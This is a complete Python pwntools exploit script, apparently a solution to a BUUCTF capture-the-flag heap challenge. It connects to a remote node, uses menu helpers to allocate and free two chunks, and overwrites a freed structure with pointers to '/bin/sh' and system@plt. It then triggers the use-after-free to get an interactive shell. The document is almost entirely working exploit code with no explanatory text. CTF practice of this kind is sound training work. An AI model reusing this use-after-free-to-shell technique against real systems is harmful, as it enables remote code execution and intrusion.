from pwn import *
context.log_level="debug"

sh=remote("node5.buuoj.cn",26641)
elf=ELF("./timu")

def create(size,content):
	sh.recvuntil(b"Your choice: ")
	sh.sendline(b"1")
	sh.recvuntil(b"Please input size: \n")
	sh.sendline(str(size))
	sh.recvuntil(b"Please input content: \n")
	sh.send(content)
	
def free(index):
	sh.recvuntil(b"Your choice: ")
	sh.sendline(b"2")
	sh.recvuntil(b"Please input list index: \n")
	sh.send(str(index))
	
def show(index):
	sh.recvuntil(b"Your choice: ")
	sh.sendline(b"3")
	sh.recvuntil(b"Please input list index: \n")
	sh.send(str(index))
	
system_plt=elf.plt["system"]
bin_sh=0x0000000000602010

create(0x80,b'aaaa') #0
create(0x80,b'bbbb') #1
free(0)
free(1)
create(0x10,p64(bin_sh)+p64(system_plt))

show(0)

sh.interactive()

